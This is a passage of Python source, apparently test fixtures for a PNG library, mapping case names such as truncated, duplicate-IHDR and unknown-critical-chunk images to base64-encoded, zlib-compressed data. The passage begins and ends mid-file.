        'transparent_bkdred': 'eJztVntQlFUUPw4zgRRalpns2DqMWCQPxwgKVMQgdlVeLoLvBUcEYgGBTyBZ2JDMAdmY0mISFmQG\nYxCEmUBAYVkQgoyE4rVS7C6w2squAp+0sKwsp2+BYB1n+qtSps589577OPeec3/nnHu/NB8vDzNT\nc1MAMGMy3HZTXKcvJkZUvU2V0gZgBD67/Nyp7mvJaB2Km2PRlYW+h3EXD4MZeIKFgWG46eq7ZqIj\na1oBuq1ACSb9AGpzmx4AGQvQHZRJ1j2Ef/GyY5Vw8iK41oNvKxzsgRMNYHE52+gcvpw3DRXfQRFC\n3QhUo+P5rjfSEH7IgK5Ka0kOowgJ6qvGgyoZbmDiO7G34+D78A3o+iL6A+50uh+4ZIoDkj1H0Z9I\n34ql9ljngqfZ+DUTi/xIXHkK4TquLemwwl4rRNO7E3TElYhv9QxY4aA9PtwmwIScWztaOvbj0H7M\n+wrSS+BCFZR/DKX5UFcCqT1wSQKNGdCZBYoUwApG0x0YVDFSH6IIsbcAyRTUFGATigYnc1CRg1SN\noiaUNSHKSJQhDjShhuqgTDOIOIgk6gn+p0VClK9sE8GNai05stPDzebWL65bqDYQu71Y+N8mYE0Y\nW1LALD3O2BcLsKxBX5ZUfx7+gBp8lXDfS7CijhHxQTHBcDwoLJKwjQwm1trbbnS+pw4DMPmW6ebq\nl3D4gcSjfF3AanffAWHYxegbz2eOSk0HXnp9QLiqToXe/eribv4r9xM9mJstlAdSM340F6z5ct97\nJca518gcvjeHGyP/mW8Xwf1IfpaWeX+X7ouf1tkv9dx+boY5/eopRiXhpGuetOzmjdHZ1emo6B5o\nE3LzmaErLhCVtFLR2JXEkPiZFQXlEo5w2JktnL4Toxw5uGWksFNmW5E8PFX821iZtCxpduO2uEa1\nOKo2kczy47XrHk1bqOg61RAxMSSymJ0f5/kgfcaAIQ5LZGANNeeg3jnf+YcExus7HXOvkn38dg73\nQ3k4jd2rmWpWxH2TrD/xJ+vzZ5kgQpk136FYR++iFHhwQ5VXSWbwFRHck/Jymuy2Rtv8yEFa8/YC\nSp3XyvWB0GU3D5Kibf3juAmcsynney7EDjHMeRzqZ26T02JRkDyC1i7ViLG+xWFrLdkgKGLrMUld\nbmm/oKbhjAGQN/vfN4iho6P5eiBDsrWWFJybND4zKTCrezX3TQO8X9h63iDUnqPvmMmdv0XdoQRd\ntqO0muwxS12uTuFncrihIY8tjivl3bMr7Kwpa8/dvmDKlF2mwItXOyFx+V0RL/A2mEpLSm9JHtmo\nDrC9Op0l5vlN5LYWoebE6FDhmMRbt2cqWEgOf+oyyRcv6Oj/l/EYrz/gIK0gtfojC/kTUVwi5Fl1\nz1+pW3UYP+NXRdUGyidpZX0J6uYqx+QK8txcGM5n7dyO82N/WrbIBGpGtQGcWo7cnWbXl3Crudih\nrpzU8ekjT7w4BultAOFiE6DuF678Es1OmnCz+QpfHFkbKa+hZT55WjOxC9dJQL2Rg0r6dGNqVaRL\ntAt77m7+QBWFQ2cCWuKnhxvG7p7uzquJwnFjRevZIpGuSZ3XdUiiydrLi+uNr2ML865dr9CqHKU6\nzdli3sMkXpq6Kjla+0hSiLZzDsku4614iu6/o22ho2NMJSPl8lIbY/2PIdPdy610e+CpPwAkjRQJ\n'.decode("base64").decode("zlib"),
        'transparent_truncated_palette': 'eJzlVntQlFUUP4wzgRRalpnu2DqMWCSCYwQFJkISu8rTRfCBLDQikgsofDzShQ3JHB4bU1hMwoLM\nYAyCMMVbWBaEIEOh5LFS7i6w2MouAp+0sKwsp2+BYB1n+quHTne+e8+ce86959zfOefeL8Xb083M\ndJ0pAJgxGbv2UlSn7ybLqHGnKqkDwIjl7e7rSrGvJKLVMdwejc4s9AlEdx6GMDCGhUFhuK3ybTPR\nB+vbAXosQQkm/QDqdVt6AWQsQFdQJlj1En7FK45WwamL4NwIPu0Q0AsxTWB+OXtZJr6YNwsV30MR\nQsMY1KD9+e7XUhB+TIfuKitJDqMICeqrwQCVDDcz8a3o27Hww/HN6Pw8+gHucRgJMprhgGTfEfQj\nUndgqS02OOFZNn7NxCJfElefQbiKG0puWWKfJaLp3Sk64mrEN3oHLHHQFh/sFGB8zs3dbbcO4vBB\nzPsKUkvgQjWUfwyl+dBQAsm9cEkCzenQlQWKJMAKRssQDKoYyQ9QhNhXgGQSagqwBUWD0zmoyEFq\nRFELyloQZSTKEAdaUEMxKNMMIg4iifoWdOPbXyh4gdjrycL/dwPWlLEFlWLLTzAORAOsaNJ3o5rP\nj9+nJl8mXPcTrMijRFxwVAicCA6LIKwjQogNttZbHe+pwwBMvmPucvaND7wvcSvf6L/W1WdAGHbx\n5LVnM8alpgMvvDogXNOgQq9+dXEP/6WR027M7ebKQ8npN9YJ1n954J0S49xaMofvxeFGyX/m24Rz\nP5Kn0TJG3HVf/LTRdrmHS+YccfjVQ4xKwkHXOm3Rw5ugs2tSUdEz0CHk5jOPrbpAVNFKRRNXTofG\nza0oKJdwhKOObOHsUJRyLODdscIumXVF4uhM8W8TZdKyhPmNO2Kb1eLI+tNkli+vU/dw1lxF16mG\nialhkfm8fJLnjfQ5B4Y5LJGBN5TMTr1nkfmHFCYbu+xzK8k7/E4O90P5cRq7TzPTqoj9JlF/4k82\n5c8TQbgya5GhyK2+p1Lh/jVVXhWZzleEc0/Jy2my2xpt60M7ad2bSyh11ZbrE6HbZhEkRcemR3ET\nOGZTwfdYyh1ilPMo1E/cJmfFomB5OK1TqhFjY5vdjnqySVDE1mOSvNLCdslM0zkDIK/3v2eQQ0fG\n8/VAhmZrLSg4t2m850pg3vZa7usGeD+347xBqj1D3z1XO3+LucPxumx7aQ3Za5a8Up3Ez+Bwj4U+\nsji2lHfPprCrrqwz12XJlRmbDIEnr35K4vS7Ik7gZSBKSUhtSxzbqva3rpzNEvN8p3Lbi1ATMz5c\nOCHx0u2bCRGSo586TfPFSzb6/2U8JhsP2UkrSK3+yEL+VCSXCH1Sw/NX5tYE4mf86sj6IPk0rexO\nvLq12j6xgsxcSMPFql3YcXHuT8+eMoW6ca0/p54jd6XZ3Im/2Vps11BO6vj0scdeHIPyNoDwaVOg\n7heu/BLNRhp/vfUKXxxRHyGvo2U8flozsRPXQUC9kYNK+mxzcnWE00kn9sLd/L4qEofP+bfFzY42\nTdw925NXF4mTxor2tCKRrkWd131Yosnaz4vti2tgC/Nqr1ZoVfZSnSatmPcggZeirk48qX0oKUTr\nhYBkl/FW/YfhH9K20dE+qoqRdHn5FmPq/waYrp67Sl2CzvwBz/EQmw==\n'.decode("base64").decode("zlib"),
        'truecolor_alpha_trns_chunk': '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\nwZP/ACPcqR8=\n'.decode("base64").decode("zlib"),
        'truecolor_trns_chunk': 'eJztV2tQE1cUjjpq1YIVqnSoQkVipxbBtk6pYohgrMQgMEEGUiEUiW3VDgGJCSSEtNLy0FaGIBFF\nScXioyoREGh4pQ7pRETjA3kJSVSQBCXZEkg2DzbbTciYxh9tf/jD1+7s3td+3/nOuefunVsQFbHJ\nZa7nXBQK5YIPwxGRErI+b0xH3obY4XNIMYtGjIhGfWe9O68HnER6pqUTN4WiqqSLR5DGnNQwUjoK\n5dpmfaZJqGcoSOci2sY4WjT1Kxojac8OVGrSzhSaf8oO2nur/VcFqXQ7UagFC/G4kK0ZZHVv5JlK\nBlsytkyWf9MnP+qHm7d/NlCjD/GIX9RGJe91ryCJfzlxqfJCwiUKERdVnOvvudGjzqXr0NYwj+oQ\nj7pP1T47Rw7xNgdeyKUsqMjxOboev/6nKCazOHN5OmBmAENSQ2MTkNfz4Jjy2iNtdrnxeG2T5RQG\nLAvMACf3g5UNTFg3C8jDDqoTWbPIuiVUsPDrpEYJ16+IUrCc4EvajueVaqp9kVpFuxueF8dFn2L5\ntZP73OePJt4dnz/Redh5xCutw2KcZ37fv4W91LSBysesgXwJq0k+7W6EGjGtEN237CCd85YJTFkz\n1tnG9btFKfAl+LW7dWJ4lMLP4vVpJd4DcxRrmQ8rnFEHXPdJy7FYGV/K9ftIlozX569RxuegSdsR\nqaMLNnWQRT3BrB792qcY48pVeRzJug9MM/C8b2pwXDSPUjDiRag5vUc7R/mUiWhTt1F9ljMk5uC5\n6KNW/6fo/z0Sbs7EuBcJKivjsG7IDCHAwbJmUUYDeEXA9JA/UisMpWDt/EwBdLJ2FRJqXlgNrhjN\n9UOYwkGExDnEBU5BtNa2IADx1Cy9hj5bqOY0tlWZbaQD9Yoxi2GDPAdg8cw3Es2BGmEDjG7g9Kvl\nZXL2Ivs021gdGWJjdWSIldWRITZBjgx5DX120F5IzNcIe+ACUB6ZIeJopoN9CnapOa8/+DrGaFHc\n0wNGNGCK5f/4HGp/haH0ptngwG4NjNV4BJv3amaAWUVN42/q/1gCKC1QG/VBuVC9cMAyLCMhuJUx\njXboSMwR5yapkZMB38nuF2bRdtmEcNH1WyPlLUp+n6XVDH2iBGRV5DT7yO3HdeYr7H5vNqy63D9Y\nDs4ewTaJlnoIPrdqRpSu7HLXh04cToa1g6cJ2CnPxEV0QXfIY0UL0NvQiamvZE66hmLvGi+zU/f/\nVTzlXnyV3jMclGyuEfMeVQed0uYE3R8LoAoi4+20HV3knA9psIquEjand0KFSQRd7xYwFthTF3t/\ngKe9z36YmymnIv8nhHz4WHqXa1eWDinP+xK+PVt+0Uhm1fnHslyqKsw5qgb4nWHGtd3Il1pyGHyb\nbMkff8B1qFissdzT1RdnSyarbT9BZHUQK+1zUh1zbgvYy1uRYFc18Vv4y94cpRdOFoIlnIfZmgN8\npTwT9k71ttQy0vjGob0DCrlw0AveAHA4QLh9W7DF8dfYHU8SF0mylhX2TcKRf/Y6kh2Cq/bdxpZg\nzBjHekCS7dzH9r3HRk0uebI67FJfm3Qy2adutcQA2OA/oaGTIik0qYB8GOOKybfBW6K7aSAsBAP4\n2lZWz5HSVyIaz7fJmn42nCyPDsxUZMxgyHroAzp4COqObWF5aVsnZgIiAOP+IrnzspqkN0FBzd7N\nUrPl8sr9Ldoy+Tav8ZTJowwJlsU3s4CiPKn4vzTq56awTWehyoQMU24WM85JIqZ93i1Y1botMQsa\nlkiPi7abnKFxAbmWO4nYTNXVYjDhd9q7551cGq3uvprY7O7VYr5Z0uY88v0BSWlKI/a43Uz3sfSI\ngCnHI2uyBRhYvQy+d9EpBKyZyDm0OXRitjNRR+PUOfSfX3oysIyxE9ZzaNzLMMf/3+SudZfMnIXD\nS4iG65RwFHLhN0bgqkK/3Pc3JH1CXw==\n'.decode("base64").decode("zlib"),
        'truncated_chunk': 'eJztV1tQU0cYjlq1asEKVTpUYURipxaltyn1EiKIlRgQBmRCKoRBYq3aISAxCQkh09Jy0dYMQSKK\nkorFS1VigkADhNQhnYhovCA3IYkKkqAkpwTIyf30JGRM40PbBx+8PZyzu7Pn+/7v//fbs7Ml8Vs2\nec31n4tAILww0VEJcGtzPG9Oh99G3PA5uJmWk7ApElErXzwCD97YGREbgUAI2POs6TPh8ZysaHwO\nAuHd5nimyUhniAjEgoWYqIitNIK2N+5MDZUpG1umKL4ZVBz/w83bPxtJiYe4CV/VxWfs863GS385\ncanmQuolYkJUfFnhKv+NfvVeXYe2RvsJIvzqP9cG7Ro5xN0cdqGQuKC6IOjoesz6n+Lp9LLc5TmA\nhQoMyY1NzUBRz4Nj6muP9PlVpuN1zfZTKLAyjAZa94M1jXRochZQhB7UpjFmESaXkED2zvQmGSek\nlFiyHBuM347hVugEwXCvut0Hw03mIE8xQtoJfb7zR9Pujs+f6DzsOROQ3WE3zbO8v0rMXGreQOKh\nVtuCsZ/hg9p9sEIpmY3sW3aQwnrbDGauHuts44TcIpYEY0PafTpRXCL7ixRDdnngwBzVGvrDak/U\nAe/v5VVotIIn54R8rMjAGIpXq1MKkPjtsNTRBZs6CJKecEaPYc1TjMlVmiKWbN0H5hkY7jfCKA6S\nSywZCcAKT+/Vz1E/FSLR3G3SnmUNSVkYDvKoI/8p+n+vhI8ncdSLBFVUshg3FMYI4GBli4TWCF7h\n0/2Uj7QqYwVYNz+XbztZ9xFcam60MKoMyQmBmWJAmMSzxCUeRXT0YmGAdGqVXkOfLVR3Gt2qzjdR\ngAbVmN24QVkAMLiWG2mWMJ2oEUI2svq1ykolc5FrmZ2sboc4Wd0OcbC6HeIU5HbIa+izg/bapDyd\nqAcqAZVxNAlLNx3sUzErLEX94ddRJrvqngEwIQEzjvfjc6j9FYZSmmeDA3t0EFrnF27Zp5sB5pU2\nj79l+GMJoLbb2kgPqkTahQP2YQUexq1ManJBR5KOeA7xTSwadCe/X5RH3u0UwkE2bI1TitW8Pnur\nxfapGlDUErJdM7cf11uuMPsDmZDmcv9gFTh7BN0sWerH/9KhGVa6ssvXEDlxOAPSD57Goqcyk5ZS\n+N0Rj1VioLexE9VQQ7d6R6Lvmi4zs/b/VTaVXkqtwT8GlG0WSrmPBGtP6QvW3h8LJfHjUly0HV2E\ngg/JkIaiEbXkdNrY6djJ3lgQB+ytx90f4OrvMx8W5ipJ8P8JJh8+ltPl3ZU3Cbfng7Hfnq26aCIw\n6lfhGF611ZYCTSP07jD12h74Sz0hGrpNsBePP+C4VSzW2e9NNpTly6wC508Q3h0JNa41ESSdiwV7\nuStSXaomfot52YejFLaVDZazHubrDvDUylwoMCvQXkfN5pmG9g2olKLBAGgDwGIBMa5jwVnHX3E7\nnhgXNpl4heuQcPvP1Yfdwb/qOm2cBqMnufcDbLZzn7jOHic1ofzJ7nBJfR3SI2SfttWeBKDD/7QN\nnZTIbVaVLYg6rrK+A96S3M0GIREYytO3MnqOVLwS1Xi+Qwr7mVCGMjEsV0WbQVX0UAYmoSFbN07M\nCNC3TswEJADK90VK52UNSWm2rW0JbJFb7JdX7hfrK5XbAsYzrUepMjSDZ2EApUVy6X9pNMzNZJrP\n2mpSaebCPHqyh0RU+7xbkKZ1W1qebVgmPy7ZbvaEJocW2u+koXM1V8vA1N/J7533SGlU0H01rcU3\nQGy5Wd7mOfPdAVlFZhP6uCtM97GcLaFTiccJ8/koSLsMunfRowSMmfA9tCVyYrYnUUfT1D30n1/6\nU9HUsROOe2jyy7DG/z/k7nWXLKyFw0sSjNeJMQgEYhF5YzI5kfQ1mZq+dwciK31X5t+OpjjZ\n'.decode("base64").decode("zlib"),
        'two_ihdr_chunk': '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\nkS8SYyNQyI+4lUyo2Lz7+F+OiCE3\n'.decode("base64").decode("zlib"),
        'two_plte_chunk': 'eJztln9MU1cUx48hy5QENCMMZ9dh9sONCWqUlSmEwqJSVJxYIVORolGBwUClhUbUlqFhItDMqo1C\nqSY4rSCNP4uCLcpbpyMTJ6xrU0ttEZm0iA9WKdD27LXKgvPv4Zbt5t173r3ve3+ddz43d/+qlXF+\nvjN8AcAvnrV4NWVdnjzZhypjrEW3AXxg1Yo1S6bvwdAMjMrDWDYmpuIKAW5hIY+NaZm4jWuZf+lT\nP/UmeivALyHQC5PvA9hnhGkBTGzAJdC7O1TLTa7133oZdh6HpbLtWYfjYpshsRVStMC7Du+eqfQR\nY4DMDRe/BzmCqh8aMOJQx4f7EX4sg47Locaq9aVnWHLkUk8DplhNNbwknB2Pn+Tp8uFm1myMnYbJ\ngMsX2dImObPBmLQZk7ml0VgfjiomHvqy4UpaxT4OHo1H+RoSA79GuIoz6+6GoD4E0bd7KBgxEPFj\nrTkELeE4ECNFftVPy364uw4frUPRAbrsCJTWwTElXBBC/QlQ1UGxFk4aoaUM2iXQUwR4kUU8AIuV\nJRQKJVQWKhSeN0JC2IoHUI1ISIQ6hVBfg2QROmqQQLWNkFiGq7CnCqkS1QSadKgjEHVoM5FUiSZE\nM4EOAm02KlNfTA4LogVJ9CT4P01g0heXkWMs7MHpGRiah1FsjE3FRAGuYOEWNvIyMY1r2Xbp0/nq\nTX6tQPeiAPdhsn0GaCFsDAXQckNr/ZMvw9bjsFO2fenhuKxmiG2FRC2kXAfemcp3xegjcweMQwEO\ndUTsxw+9KICxKrT0zHo5srwocK2mFF5SjRcFzAdd1uybYyhg2iRbNjiTNhuTuRiNpeFYz0TVlw2H\n0iqucHBfPB5dQ8rHUMAQ9NDg243BOORFgWoxh6MlRjrAr8JlP/y0Dj00HKCLjoCsDkqVcEwIF05A\nfR2otFBshJNl0CKB9iLoucjCB0BYWRYPBxQNHhIUEkJI2CQDWEyFukRIKIS6GtQXIVmDDir2CYlt\nuMoyhgIV6QTqKAKosNeRHg503iYPDTbC5kWB4sBDA3ppeNXR8d9K3QTxG2WmbGOtzQPwv+HJkwI/\nWiakGt/kLvmCy87dyi3YuGMLbNuYmcOdk7OFOzN8zrzI3+yZAL5h8Ytj1/BT+4xx4s1xgcKfrxcu\naL6/L+idvUOdU0RPZkYdjOFPvdEox4SCX9/KnOWYrzz7zdX0b7cP9qlO75or4XUn0kRGvkkzGvH4\nnuN3TToj+hJJSuWcN47tnXUiPuOZSW+0jXDe9i/hHP1c7l6Oww/WOgVtR6wRA/s8mrv6OVfcI5Lc\nFT17n1eVqUP2tg1RC6Uj1vT+UfMTUcBZmVig3eXsdd19zzsq9/LyenUDmUPIVrv8plaPiuvUg/0l\nLcMGwVLvnNK+jatw2nPpX1dTOfLBn5W/SdA48E15XG5UTtd7tGCdw6lJj4g+R557yS8TsJIJEESS\nI9K4nKg9XS20YKPDoglidJ4nH9KlCRnjdNKE9IAXerXrx9Wov85lvDAL4//uE9W9vmlzVxJNpOff\n0LweEX2RrC4vyGnand4reVH23Z74F4b96l8pWNnk7qbNNfK7NVbGYz2/XWNgdF4iK15CM1Jrcitb\nzH5B7WHPmnc+dreYn9AGX3vmZLes0b+Eec/Rl4utVlHLmOihW2AsbNstuLaQ4x3pnLLBWnCktVbd\n38aMXC9wthWKDHmfie+8H04vzLXPO83MNw2dCqYrn519i5529p4YkaU6E420z0+5rwVdL+lvuyVT\ndK51njTymRGcaZ7FPdIV1g4+qcxtmhU+JcE7lsfcZ9iX/1mhzKNstvr98YLbEyDI7w6kzTXwSc0g\no1pNHi7PzW7idRkjX8FKJmKzFrtCz7drxIzqBtJW3pOzi9cVSTMZjv4DzuS/QRCgEGg1CxjV58kH\n5UHZUeldWTTTPcfj2x1zxznlTs2FBNfBO+MctcjwrxRI+a4FEdUqsqP81FcpRr5Zc4ChUm0femm3\nG3a46CUt5pKH4lp115Byw7WnzcXDzwNGsk7QJzJFr+eMGgwVhoBaZj5n1K6sMIjl6qfN38s6pHQn\nu465qE/cXzvk08iupW4075Qxr4xUtrlCtBzXLbOpJxcXPnd/q0K9/xW6Y4fLWIBTD2xyZWfEhNk8\n9874JSsX13+W9vUfcJuzzw==\n'.decode("base64").decode("zlib"),
        'unknown_critical_chunk': 'eJztV2lQU1cYTXXUqgUrVHFoBURipxbBtk6pYohArMSgMCwDVAhFYivqEJaQhISQqbQs2soQJKIo\nqVjcJQICDVvqkE5EFBdkE5KoIAlK8kogeVl4eX2EjGn80faHP9wyebn35b5zvvN999x35xaEbt9i\nt8B5AQqFssMH4cKQFpq+3p2F/OqiRi4gzbLAMHwEZXdSuhvyTXBLTEuiJCUm7HNL3J2RvFd73msY\neWZ+SlBMOgpl3zZ9vSMmnyUhfy6lbI6mhJO/o9AS0nahUhKSkileybsobuu81voqNEko1OIleJx/\nBJ2o7As5W0ljicdXSvJvu+eH/nj77i86cvhhbtg3taGJGY4VMaJfT16pvBR3hRSGCy3O9XLe7FRn\n1304Isip2t+p7kule9LoYe5Wn0u5pMUVOe7HNuE3/RzKYBRnrkoHjDRguFPX2ATk9T46Lr/xRJ1d\nrj9R22Q6jQHLfOjg1AGwsoEBa+YCedghZTxzLlGznAwWfp/QKOZ4FpEKVhE8YnbiuaWqag+kV9Hu\ngOdGc9CnmZ7txH7HRWPx9ycWTXYdsR1xSe0w6RcaP/ZqYa0wBJJ5mPWQB2FdjHu7A6FGRClE9688\nRGW/bwCT1493tXE875AKPAie7Q5dGC6p8KtYbWqJ6+B82QbG4wpb1EH7/Z3lWKyE18nx/EySiNfm\nr5fH5qBjdiJSxxZv6SAKe/2YvdoNzzFGlyvy2OKNnxhm47m7a3AcNJdUMOpCqDmTpp4vfy5EuKFH\nrzzHHhax8Rz0sen8Z+j/vRIOtsS4VwkqKWMzb0l0/sChsmYhvQG8xmc4SZ8oZbpSsHZRJh86VbsW\nKTU3qAZXjOZ4IkzBIEJiW+ICmyJO97YhANHMLL2Fvlio6gy2VZ6tpwL1snGTLlCaAzC5xlvxRh+V\noAFGN7AHlNIyKWupZZrNrFaHmFmtDplmtTrELMjqkLfQFwftg0Q8laAXLgClIXQhWzUL7JexSo15\nA343MXqT7IEW0KMBQxTvp5dQ+xsMpTbNAwf3qmCsysnPmKGaDWYVNU28p/1jOSA3QW3kR+UC5ZJB\n04gkBsGtiWy0QEcjj9rexjSy6fC97AFBFmWPWQgHXR8RIm2R8/pNrUboCzkgqSKmWkbuPq0zXmMN\nuLJgxdWBoXJw3ii2SbjCif/1tGZE6ZpuR23A5JFEWD10hoCdyUxUROX3+D+VtQB9DV2Y+krGlH0A\n9r7+KivlwF/FM+nFVmmdg0Hx1hoR90m172l1ju/DcW8yPyTWQtvRTcz5lAIrqApBc3oXVJhA0PRt\nA6OAtLqoh4Nc9UPW49xMKRl5PyHkI8fTu+27szRIe9GDsO9c+WU9kVnnFcW0q6ow5iga4GUjtBt7\nkSfVxCD4LtGUP/GIY1Xxkcr0QFNfnC2eqja/BJHVEVZpmZPqyAvbwD7u6jiLqsnzwa/77Ri1cKoQ\nLGE/zlYd5MmlmbBriquplpbK0w9nDMqkgiEXOBBgs4Fgy7ZgruNvUbueGRcxWctqyyZh9Z+lj7iD\nf92y25gNxoi0rgfEbBc+t+w9ZmpiybPVYZH6NqRNyH5lqykSwPr9CQ2fEnZCUzLInTYhm/oAvCO8\nnwrCAtCbp25l9h4tfSOq8XKHrBlgwYnScJ9MGX02TdJLHdTAw1BPVAvTRd06OQcQAhjHVymd1zUk\ntQnybXZt7jSarq450KI